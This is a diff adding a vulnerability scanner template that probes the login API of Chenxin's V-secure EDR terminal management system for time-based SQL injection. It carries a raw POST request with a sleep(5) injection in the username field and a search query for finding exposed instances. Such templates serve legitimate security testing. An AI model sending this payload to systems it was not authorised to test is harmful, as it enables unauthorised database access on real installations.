@@ -1,0 +1,27 @@
+http:
+- matchers:
+  - condition: and
+    dsl:
+    - duration>=5
+    - status_code==200
+    type: dsl
+  raw:
+  - "@timeout: 10s\nPOST /api/user/login HTTP/1.1\nHost: {{Hostname}}\nAccept: */*\n\
+    Content-Type: application/x-www-form-urlencoded\nAccept-Encoding: gzip, deflate\n\
+    Accept-Language: zh-CN,zh;q=0.9\nConnection: close        \n\ncaptcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='\n"
+id: v-secure-edr-login-sqli
+info:
+  author: Co5mos
+  description: Chenxin Lingchuang and Chenxin Jingyun Terminal Security Management
+    System login has a SQL injection vulnerability, through which attackers can obtain
+    sensitive information from the database.
+  metadata:
+    hunter-query: "app=\"\u8FB0\u4FE1\u9886\u521B-\u666F\u4E91\u7EC8\u7AEF\u5B89\u5168\
+      \u7BA1\u7406\u7CFB\u7EDF\""
+    max-request: 2
+    verified: true
+  name: V-secure EDR Login - SQL injection
+  reference:
+  - https://peiqi.wgpsec.org/wiki/webapp/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B/%E8%BE%B0%E4%BF%A1%E9%A2%86%E5%88%9B%20%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20login%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  severity: high
+  tags: v-secure,sqli
